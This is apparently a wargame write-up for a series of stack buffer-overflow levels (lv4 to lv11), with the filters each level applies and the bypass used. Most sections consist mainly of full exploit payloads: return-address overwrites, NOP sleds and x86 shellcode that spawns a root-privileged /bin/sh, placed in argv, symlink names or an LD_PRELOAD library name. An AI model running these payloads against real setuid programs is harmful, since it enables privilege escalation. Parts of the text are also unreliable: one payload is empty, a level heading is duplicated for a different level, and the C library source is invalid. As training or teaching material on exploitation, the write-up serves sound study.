### 0. lv4 > lv5

filters:
- argc > 1
- set env values to 0
- argv[1][0x2f] == 0xff

environment values are being wiped out, so let's use argvs

payload : `` `python -c 'print "A"*(0x28+0x4) + "\x08\xd4\xff\xff " +"\x90"*2000 +  "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'` ``

### 1. lv5 > lv6

filters:
- argc > 1
- set env values to 0
- argv[1][0x2f] == 0xff
- len(argv[1]) < 0x30

length filter is added to argv[1], so let's just put the shellcode in argv[2]

payload : `` ``

### 2. lv6 > lv7

filters:
- argc > 1
- len(argv[0]) == 0x4d
- set env values to 0
- argv[1][0x2f] == 0xff

since argv[0]'s length is filtered, use symbolic link to satisfy the condition.

payload : `` ./aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa `python -c "print 'a'*(0x28+4) + '\x30\xd3\xff\xff'"` `python -c "print'\x90'*80 + '\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' "` ``

### 3. lv7 > lv8

filters:
- set env values to 0
- argv[1][0x2f] == 0xff
- argc == 2
- len(argv[1]) <= 0x30

We can use symbolic link to store shellcode inside argv[0].
However, the shellcode shouldn't contain any '\x2f', which seems inevitable since '/bin/sh' is needed.

But we can still bypass this by using "packed" shellcode

shellcode:
``\x31\xc0\x50\xbe\x2e\x2e\x72\x67\x81\xc6\x01\x01\x01\x01\x56\xbf\x2e\x62\x69\x6e\x47\x57\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80``

payload : `` `python -c 'print "./" + "\x90"*100 + "\x66\xb8\xf0\x03\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\xbe\x2e\x2e\x72\x67\x81\xc6\x01\x01\x01\x01\x56\xbf\x2e\x62\x69\x6e\x47\x57\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'` `python -c 'print "a"*(0x28+4)+"\x30\xd3\xff\xff"'` ``

### 4. lv8 > lv9

filters:
- set env values to 0
- argc > 1
- argv[1][0x2f] == \xff
- argv[1][0x2e] != \xff

since the argv[1] is copied to ebp-0x28, return address would be [0x2f][0x2e][0x2d][0x2c].

What this means is that the second most significat byte of the return address can not be \xff.

If we increase the argv size, the address decreases. Magnifying this leads the stack to use address starting with \xff\xfe.

payload : `` `python -c "print 'a'*(0x28+4) + '\x45\xb2\xfe\xff' + '\x90'*0x12222 + '\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'"` ``

### 5. lv9 > lv10

filters:
- argc > 1
- env = 0
- argv[1][0x2f] == \xff
- overwrite argvs and buffer with 0 (excluding return address)

since the every input we've used before gets removed (except the return address), this seemed hopeless. But after a bit of research, I was able to find out that there is "program name" stored at the top of the stack.

By using symbolic link and a little bit of debugging, I solved the problem.

payload : `` `python -c "print './'+ '\x90'*100 + '\x66\xb8\xf2\x03\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\xbe\x2e\x2e\x72\x67\x81\xc6\x01\x01\x01\x01\x56\xbf\x2e\x62\x69\x6e\x47\x57\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'"` `python -c "print 'a'*(0x28+4) + '\xa0\xdf\xff\xff'"` ``

### 6. lv10 > lv11

filters:
- argc > 1
- argv[1][0x2f] == \xff
- overwrite buffer with 0 (excluding return address)

it is simillar to previous one, but this time it allows env values.

We have to make use of environments' LD_PRELOAD.

I solved this by creating a empty library ELF with the name that includes shellcode (without \x2f)

create source code of empty library
```c
// source.c
public void a{

}
```

compile

```bash
gcc -fPIC -shared source.c -o `python -c "print './' + '\x90'*100 + '\x66\xb8\xf3\x03\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\xbe\x2e\x2e\x72\x67\x81\xc6\x01\x01\x01\x01\x56\xbf\x2e\x62\x69\x6e\x47\x57\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'`
```
set LD_PRELOAD

```bash
export LD_PRELOAD="/home/lv10/`python -c "print './' + '\x90'*100 + '\x66\xb8\xf3\x03\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\xbe\x2e\x2e\x72\x67\x81\xc6\x01\x01\x01\x01\x56\xbf\x2e\x62\x69\x6e\x47\x57\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'`"
```

payload : `` `python -c "print 'a'*(0x28+4) + '\x01\xbf\xff\xff'"` ``


### 6. lv10 > lv11

filters:
- argc > 1
- can overwrite stack to ebp+1

ebp contains stack frame pointer, which means that we can overwrite 1  least significant byte of the sfp.

We have to know basic stack structure for this.

|offset|value|
|--|--|
|ebp|sfp|
|ebp+4|return address|
|ebp+8|argc|
|ebp+12|argv|
|...|...|

if we put shellcode in argv[2] and overwrite sfp with address for (argv[2] - 4), we can make the program return to argv[2] and execute the shellcode.

After a lot of debugging, I was able to find the correct offset.

payload: `` `python -c "print 'a'*0x28 + '\xf8\xaa\xaa\xaa ' + '\x90'*100 + '\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'"` ``
